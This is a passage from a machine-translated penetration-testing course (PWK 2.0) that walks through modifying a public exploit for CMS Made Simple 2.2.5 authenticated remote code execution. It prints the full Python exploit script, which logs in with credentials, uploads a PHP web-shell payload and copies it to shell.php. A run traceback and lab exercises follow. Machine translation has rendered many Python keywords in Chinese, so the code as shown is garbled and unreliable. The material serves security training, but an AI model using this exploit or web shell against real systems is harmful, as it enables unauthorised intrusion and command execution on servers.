<div style="position:absolute;top:34943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 GET 请求中以明文形式传递的命令。</font></font></nobr></div>
<div style="position:absolute;top:34976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成所有编辑后，最终的漏洞利用应如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># Exploit Title: CMS Made Simple 2.2.5 认证远程代码执行</font></font></nobr></div>
<div style="position:absolute;top:35028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 日期：2018 年 7 月 3 日</font></font></nobr></div>
<div style="position:absolute;top:35045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 漏洞利用作者：Mustafa Hasan (@strukt93)</font></font></nobr></div>
<div style="position:absolute;top:35062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 供应​​商主页：http://www.cmsmadesimple.org/</font></font></nobr></div>
<div style="position:absolute;top:35079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 软件链接：http://www.cmsmadesimple.org/downloads/cmsms/</font></font></nobr></div>
<div style="position:absolute;top:35096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 版本：2.2.5</font></font></nobr></div>
<div style="position:absolute;top:35113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># CVE：CVE-2018-1000094</font></font></nobr></div>
<div style="position:absolute;top:35147;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口请求</font></font></nobr></div>
<div style="position:absolute;top:35164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导入 base64</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:35198;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">base_url = "https://10.11.0.128/admin"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上传目录=“/上传”</font></font></nobr></div>
<div style="position:absolute;top:35232;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">upload_url = base_url.split('/admin')[0] + upload_dir</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:35249;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名 = "管理员"</font></font></b></nobr></div>
<div style="position:absolute;top:35266;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码 = "HUYfaw763"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param = "__c"</font></font></nobr></div>
<div style="position:absolute;top:35317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">txt_filename = 'cmsmsrce.txt'</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:35334;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">php_filename = 'shell.php'</font></font></b></nobr></div>
<div style="position:absolute;top:35351;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">payload = "&lt;?php system($_GET['cmd']);?&gt;"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">def parse_csrf_token（位置）：</font></font></nobr></div>
<div style="position:absolute;top:35401;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 location.split(csrf_param + "=")[1]</font></font></nobr></div>
<div style="position:absolute;top:35436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义身份验证（）：</font></font></nobr></div>
<div style="position:absolute;top:35452;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">page = "/login.php"</font></font></nobr></div>
<div style="position:absolute;top:35469;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">url = base_url + 页面</font></font></nobr></div>
<div style="position:absolute;top:35486;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据 = {</font></font></nobr></div>
<div style="position:absolute;top:35503;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“用户名”：用户名，</font></font></nobr></div>
<div style="position:absolute;top:35520;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“密码”：密码，</font></font></nobr></div>
<div style="position:absolute;top:35537;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"登录提交": "提交"</font></font></nobr></div>
<div style="position:absolute;top:35554;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:35571;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, allow_redirects=False, verify=False)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35588;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">status_code = response.status_code</font></font></nobr></div>
<div style="position:absolute;top:35605;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果状态代码 == 302：</font></font></nobr></div>
<div style="position:absolute;top:35622;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[+] 使用提供的凭据成功验证”</font></font></nobr></div>
<div style="position:absolute;top:35639;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 response.cookies, parse_csrf_token(response.headers['Location'])</font></font></nobr></div>
<div style="position:absolute;top:35656;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[-] 认证失败”</font></font></nobr></div>
<div style="position:absolute;top:35673;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回无，无 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:35815;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="31"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 31 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:35848;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:36925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:36925;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:36925;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">472</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:35944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">def upload_txt(cookies, csrf_token):</font></font></nobr></div>
<div style="position:absolute;top:35960;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mact = "文件管理器,m1_,上传,0"</font></font></nobr></div>
<div style="position:absolute;top:35977;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">page = "/moduleinterface.php"</font></font></nobr></div>
<div style="position:absolute;top:35994;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">url = base_url + 页面</font></font></nobr></div>
<div style="position:absolute;top:36012;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据 = {</font></font></nobr></div>
<div style="position:absolute;top:36028;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“麦克”：麦克，</font></font></nobr></div>
<div style="position:absolute;top:36045;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param: csrf_token,</font></font></nobr></div>
<div style="position:absolute;top:36062;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“禁用缓冲区”：1</font></font></nobr></div>
<div style="position:absolute;top:36079;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:36096;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">txt = {</font></font></nobr></div>
<div style="position:absolute;top:36113;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'m1_files[]': (txt_filename, payload)</font></font></nobr></div>
<div style="position:absolute;top:36130;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:36147;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[*] 正在尝试上传 {}...”.format(txt_filename)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:36164;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:36181;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">status_code = response.status_code</font></font></nobr></div>
<div style="position:absolute;top:36198;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果状态代码 == 200：</font></font></nobr></div>
<div style="position:absolute;top:36215;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "[+] 成功上传 {}".format(txt_filename)</font></font></nobr></div>
<div style="position:absolute;top:36232;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回真</font></font></nobr></div>
<div style="position:absolute;top:36249;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">print "[-] 上传 {} 时出错".format(txt_filename)</font></font></nobr></div>
<div style="position:absolute;top:36266;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回无</font></font></nobr></div>
<div style="position:absolute;top:36300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">def copy_to_php(cookies, csrf_token):</font></font></nobr></div>
<div style="position:absolute;top:36317;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mact = "文件管理器，m1_，文件操作，0"</font></font></nobr></div>
<div style="position:absolute;top:36334;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">page = "/moduleinterface.php"</font></font></nobr></div>
<div style="position:absolute;top:36351;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">url = base_url + 页面</font></font></nobr></div>
<div style="position:absolute;top:36368;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">b64 = base64.b64encode(txt_filename)</font></font></nobr></div>
<div style="position:absolute;top:36385;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">序列化 = 'a:1:{{i:0;s:{}:"{}";}}'.format(len(b64), b64)</font></font></nobr></div>
<div style="position:absolute;top:36402;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数据 = {</font></font></nobr></div>
<div style="position:absolute;top:36419;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“麦克”：麦克，</font></font></nobr></div>
<div style="position:absolute;top:36436;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csrf_param: csrf_token,</font></font></nobr></div>
<div style="position:absolute;top:36453;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"m1_fileactioncopy": "",</font></font></nobr></div>
<div style="position:absolute;top:36469;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“m1_path”：上传目录，</font></font></nobr></div>
<div style="position:absolute;top:36486;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“m1_selall”：序列化，</font></font></nobr></div>
<div style="position:absolute;top:36504;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"m1_destdir": "/",</font></font></nobr></div>
<div style="position:absolute;top:36521;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"m1_destname": php_filename,</font></font></nobr></div>
<div style="position:absolute;top:36538;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"m1_submit": "复制"</font></font></nobr></div>
<div style="position:absolute;top:36554;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:36571;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "[*] 试图将 {} 复制到 {}...".format(txt_filename, php_filename)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:36588;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, v</font></font></b></nobr></div>
<div style="position:absolute;top:36605;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">验证=假）</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:36622;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">status_code = response.status_code</font></font></nobr></div>
<div style="position:absolute;top:36639;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果状态代码 == 302：</font></font></nobr></div>
<div style="position:absolute;top:36656;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 response.headers['Location'].endswith('copysuccess'):</font></font></nobr></div>
<div style="position:absolute;top:36673;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[+] 文件复制成功”</font></font></nobr></div>
<div style="position:absolute;top:36690;left:206"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回真</font></font></nobr></div>
<div style="position:absolute;top:36707;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "[-] 复制时出错，可能 {} 已经存在".format(php_fi</font></font></nobr></div>
<div style="position:absolute;top:36724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名字）</font></font></nobr></div>
<div style="position:absolute;top:36741;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回无    </font></font></nobr></div>
<div style="position:absolute;top:36775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义退出（）：</font></font></nobr></div>
<div style="position:absolute;top:36792;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印“[-] 漏洞利用失败”</font></font></nobr></div>
<div style="position:absolute;top:36809;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口（）</font></font></nobr></div>
<div style="position:absolute;top:36843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义运行（）：</font></font></nobr></div>
<div style="position:absolute;top:36860;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">饼干，csrf_token = 认证（）</font></font></nobr></div>
<div style="position:absolute;top:36877;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果不是饼干： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:37003;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="32"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 32 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:37036;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:38113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:38113;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:38113;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">473</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37132;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">放弃（）</font></font></nobr></div>
<div style="position:absolute;top:37148;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果不是 upload_txt(cookies, csrf_token)：</font></font></nobr></div>
<div style="position:absolute;top:37165;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">放弃（）</font></font></nobr></div>
<div style="position:absolute;top:37182;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果不是 copy_to_php(cookies, csrf_token)：</font></font></nobr></div>
<div style="position:absolute;top:37200;left:174"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">放弃（）</font></font></nobr></div>
<div style="position:absolute;top:37216;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">print "[+] 漏洞利用成功，shell 可在：{}".format(upload_url + '/' +</font></font></nobr></div>
<div style="position:absolute;top:37233;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">php_文件名）</font></font></nobr></div>
<div style="position:absolute;top:37267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步（）</font></font></nobr></div>
<div style="position:absolute;top:37287;left:246"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 454 - 修改后的漏洞利用包含我们案例所需的更改</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行漏洞利用会产生一个意外错误：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37351;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python 44976_modified.py</font></font></font></b></nobr></div>
<div style="position:absolute;top:37368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:849: InsecureRequestWarning</font></font></nobr></div>
<div style="position:absolute;top:37385;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 正在发出未经验证的 HTTPS 请求。</font><font style="vertical-align: inherit;">添加证书验证是强</font></font></nobr></div>
<div style="position:absolute;top:37402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建议。</font><font style="vertical-align: inherit;">请参阅：https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warning</font></font></nobr></div>
<div style="position:absolute;top:37419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">秒</font></font></nobr></div>
<div style="position:absolute;top:37436;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不安全请求警告）</font></font></nobr></div>
<div style="position:absolute;top:37453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 使用提供的凭据成功验证</font></font></nobr></div>
<div style="position:absolute;top:37470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回溯（最近一次调用最后一次）：</font></font></nobr></div>
<div style="position:absolute;top:37487;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;module&gt; 中的文件“44976_modified.py”，第 103 行</font></font></nobr></div>
<div style="position:absolute;top:37504;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">跑步（）</font></font></nobr></div>
<div style="position:absolute;top:37521;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行中的文件“44976_modified.py”，第 94 行</font></font></nobr></div>
<div style="position:absolute;top:37538;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">饼干，csrf_token = 认证（）</font></font></nobr></div>
<div style="position:absolute;top:37555;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件“44976_modified.py”，第 38 行，在认证中</font></font></nobr></div>
<div style="position:absolute;top:37571;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 response.cookies, parse_csrf_token(response.headers['Location'])</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:37588;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件“44976_modified.py”，第 24 行，在 parse_csrf_token</font></font></b></nobr></div>
<div style="position:absolute;top:37606;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 location.split(csrf_param + "=")[1]</font></font></b></nobr></div>
<div style="position:absolute;top:37623;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IndexError：列表索引超出范围</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:37642;left:216"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 455 - 运行修改后的漏洞利用版本时出现 Python 错误</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 455 显示在</font><i><font style="vertical-align: inherit;">parse_csrf_token</font></i><font style="vertical-align: inherit;">执行期间触发了异常</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:37691;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码第 24 行的函数。</font><font style="vertical-align: inherit;">错误告诉我们代码试图访问一个不存在的</font></font></nobr></div>
<div style="position:absolute;top:37710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过访问 Python 列表的第二个元素 (location.split(csrf_param + “=”)[1]）来访问 Python 列表的元素。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:37744;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:37774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.连接到你的专用Linux实验室客户端并启动apache2服务；</font><font style="vertical-align: inherit;">目标网站</font></font></nobr></div>
<div style="position:absolute;top:37794;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序位于 /var/www/https/ 下。</font></font></nobr></div>
<div style="position:absolute;top:37822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.修改原exploit，将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">base_url</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为你的正确IP地址</font></font></nobr></div>
<div style="position:absolute;top:37841;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专用 Linux 实验室客户端以及 HTTPS 协议。</font></font></nobr></div>
<div style="position:absolute;top:37869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 熟悉</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">requests</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Python 库并相应地调整您的漏洞利用以避免 SSL</font></font></nobr></div>
<div style="position:absolute;top:37889;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确认。</font></font></nobr></div>
<div style="position:absolute;top:37917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 编辑</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量以匹配我们测试用例中的变量（用户名</font></font></nobr></div>
<div style="position:absolute;top:37937;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“admin”，密码“HUYfaw763”）。</font></font></nobr></div>
<div style="position:absolute;top:37965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 尝试针对Linux实验室客户端运行漏洞利用程序，是否有效？</font><font style="vertical-align: inherit;">如果不是，请尝试解释原因。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:38191;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="33"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 33 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:38224;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:39301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:39301;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:39301;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">474</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:38320;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">15.2.4</font></font></i></nobr></div>
<div style="position:absolute;top:38320;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对“索引超出范围”错误进行故障排除</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:38358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查我们的漏洞利用程序的第 24 行，我们注意到它使用了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">split </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">395</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法来对字符串进行切片</font></font></nobr></div>
<div style="position:absolute;top:38377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存储在</font><font style="vertical-align: inherit;">传递给</font><i><font style="vertical-align: inherit;">parse_csrf_token</font></i><font style="vertical-align: inherit;">函数</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">位置</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数中</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">蟒蛇</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:38396;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">split </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">396 的</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档</font><font style="vertical-align: inherit;">表明此方法使用可选的</font></font></nobr></div>
<div style="position:absolute;top:38416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分隔符作为第一个参数传递。</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">split</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回的字符串切片</font><font style="vertical-align: inherit;">然后存储在 Python 中</font></font></nobr></div>
<div style="position:absolute;top:38435;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过索引访问的</font><i><font style="vertical-align: inherit;">列表</font></i><font style="vertical-align: inherit;">对象：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
